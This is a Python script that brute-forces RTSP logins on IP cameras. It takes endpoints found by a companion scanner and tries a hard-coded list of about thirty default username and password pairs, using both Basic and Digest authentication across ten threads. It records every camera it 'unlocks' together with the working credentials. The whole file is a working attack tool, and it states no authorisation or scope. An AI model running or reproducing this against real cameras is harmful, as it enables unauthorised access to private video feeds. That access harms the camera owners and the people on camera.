"""RTSP brute-force for cams that respond with 401 Unauthorized.

Tests default credentials on RTSP endpoints found by rtsp_scan.py.
Supports both Basic and Digest auth schemes.
"""

import os
import sys
import csv
import json
import time
import socket
import re
import hashlib
import secrets
import concurrent.futures

WORKDIR = r"C:\Users\eli6-admin\Documents\eli6-surveillance"
RTSP_PROGRESS = os.path.join(WORKDIR, "camera_testing", "rtsp_scan_progress.json")
BF_RESULTS = os.path.join(WORKDIR, "camera_testing", "rtsp_bf_results.json")
BF_PROGRESS = os.path.join(WORKDIR, "camera_testing", "rtsp_bf_progress.json")

# Default credentials for common cam brands
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", ""),
    ("admin", "password"),
    ("admin", "camera"),
    ("admin", "VB"),
    ("admin", "canon"),
    ("admin", "Canon"),
    ("admin", "i-pro"),
    ("admin", "admin12345"),
    ("root", "root"),
    ("root", ""),
    ("root", "pass"),
    ("root", "admin"),
    ("user", "user"),
    ("user", ""),
    ("guest", "guest"),
    ("operator", "operator"),
    ("admin1", ""),
    ("admin1", "12345"),
    ("admin2", ""),
    ("admin2", "12345"),
    ("viewer", ""),
    ("viewer", "viewer"),
    ("setup", ""),
    ("setup", "setup"),
    ("service", "service"),
    ("maintenance", ""),
    ("maintenance", "admin"),
]


def load_progress():
    if os.path.exists(BF_PROGRESS):
        try:
            with open(BF_PROGRESS, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"tested": {}, "unlocked": 0}


def save_progress(p):
    try:
        tmp = BF_PROGRESS + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(p, f)
        os.replace(tmp, BF_PROGRESS)
    except Exception:
        pass


def load_findings():
    if os.path.exists(RTSP_PROGRESS):
        try:
            with open(RTSP_PROGRESS, "r", encoding="utf-8") as f:
                d = json.load(f)
                return d.get("findings", {})
        except Exception:
            pass
    return {}


def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


def try_rtsp_basic(host, port, path, user, pw, timeout=5):
    """Try RTSP with HTTP Basic Auth."""
    try:
        import base64
        creds = base64.b64encode(f"{user}:{pw}".encode()).decode()
        sock = socket.create_connection((host, port), timeout=timeout)
        req = f'DESCRIBE rtsp://{host}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {creds}\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while b'\r\n\r\n' not in data and len(data) < 5000:
                d = sock.recv(1024)
                if not d: break
                data += d
        except socket.timeout: pass
        sock.close()
        if b'RTSP/1.0 200' in data:
            return True
    except Exception:
        pass
    return False


def try_rtsp_digest(host, port, path, user, pw, realm, nonce, timeout=5):
    """Try RTSP with Digest Auth."""
    try:
        # Compute digest response
        ha1 = md5(f"{user}:{realm}:{pw}")
        ha2 = md5(f"DESCRIBE:rtsp://{host}:{port}{path}")
        nc = "00000001"
        cnonce = secrets.token_hex(8)
        response = md5(f"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}")
        auth = (
            f'Digest username="{user}", realm="{realm}", '
            f'nonce="{nonce}", uri="rtsp://{host}:{port}{path}", '
            f'algorithm=MD5, qop=auth, nc={nc}, cnonce="{cnonce}", '
            f'response="{response}"'
        )
        sock = socket.create_connection((host, port), timeout=timeout)
        req = f'DESCRIBE rtsp://{host}:{port}{path} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: {auth}\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while b'\r\n\r\n' not in data and len(data) < 5000:
                d = sock.recv(1024)
                if not d: break
                data += d
        except socket.timeout: pass
        sock.close()
        if b'RTSP/1.0 200' in data:
            return True
    except Exception:
        pass
    return False


def get_auth_challenge(host, port, path, timeout=5):
    """Send DESCRIBE and get the WWW-Authenticate challenge."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        req = f'DESCRIBE rtsp://{host}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while b'\r\n\r\n' not in data and len(data) < 5000:
                d = sock.recv(1024)
                if not d: break
                data += d
        except socket.timeout: pass
        sock.close()
        if b'401' not in data[:100]:
            return None  # No auth required
        # Parse challenge
        m = re.search(rb'WWW-Authenticate:\s*(\w+)\s+(.+)', data)
        if not m:
            return None
        scheme = m.group(1).decode()
        params_str = m.group(2).decode()
        params = {}
        for match in re.finditer(r'(\w+)="?([^",]+)"?', params_str):
            params[match.group(1)] = match.group(2)
        return {"scheme": scheme, "params": params}
    except Exception:
        pass
    return None


def bf_one(host_port, progress):
    """Try BF on one RTSP endpoint."""
    host, port = host_port
    key = f"{host}:{port}"
    if key in progress.get("tested", {}):
        return None

    progress.setdefault("tested", {})[key] = True

    # Get auth challenge
    challenge = get_auth_challenge(host, port, '/stream1')
    if not challenge:
        # Try other paths
        for path in ['/', '/live.sdp', '/11', '/MediaInput/h264/stream_1']:
            challenge = get_auth_challenge(host, port, path)
            if challenge:
                break
    if not challenge:
        return None

    scheme = challenge["scheme"]
    params = challenge["params"]
    realm = params.get("realm", "User")
    nonce = params.get("nonce", "")

    for user, pw in DEFAULT_CREDS:
        try:
            if scheme.lower() == "basic":
                if try_rtsp_basic(host, port, '/stream1', user, pw):
                    return {"host": host, "port": port, "user": user, "pass": pw, "scheme": "basic"}
            elif scheme.lower() == "digest":
                if try_rtsp_digest(host, port, '/stream1', user, pw, realm, nonce):
                    return {"host": host, "port": port, "user": user, "pass": pw, "scheme": "digest", "realm": realm}
        except Exception:
            continue
    return None


def main():
    print(f"[RTSP BF] Loading findings from {RTSP_PROGRESS}", flush=True)
    findings = load_findings()
    if not findings:
        print("[RTSP BF] No RTSP findings to test.")
        return

    print(f"[RTSP BF] {len(findings)} endpoints to test", flush=True)

    progress = load_progress()
    bf_results = {}
    if os.path.exists(BF_RESULTS):
        try:
            with open(BF_RESULTS, "r", encoding="utf-8") as f:
                bf_results = json.load(f)
        except Exception:
            pass

    targets = []
    for k in findings:
        host, port = k.split(":")
        port = int(port)
        if k not in progress.get("tested", {}):
            targets.append((host, port))

    if not targets:
        print("[RTSP BF] Nothing to do.")
        return

    unlocked = 0
    completed = 0
    start = time.time()

    def do_bf(args):
        try:
            return bf_one(args, progress)
        except Exception as e:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        for result in executor.map(do_bf, targets):
            completed += 1
            if result:
                key = f"{result['host']}:{result['port']}"
                bf_results[key] = result
                unlocked += 1
                progress["unlocked"] = progress.get("unlocked", 0) + 1
                print(f"  [{completed}/{len(targets)}] UNLOCKED {key} via {result['scheme']} {result['user']}:{result['pass']}", flush=True)
            else:
                print(f"  [{completed}/{len(targets)}] failed", flush=True)
            if completed % 5 == 0:
                save_progress(progress)
                with open(BF_RESULTS, "w", encoding="utf-8") as f:
                    json.dump(bf_results, f, indent=2)
                elapsed = time.time() - start
                rate = completed / max(elapsed, 1)
                print(f"  Progress: {completed}/{len(targets)}, unlocked {unlocked}, {rate:.1f}/s", flush=True)

    save_progress(progress)
    with open(BF_RESULTS, "w", encoding="utf-8") as f:
        json.dump(bf_results, f, indent=2)
    print(f"\n[RTSP BF] Done. Unlocked {unlocked}/{len(targets)}.", flush=True)


if __name__ == "__main__":
    main()
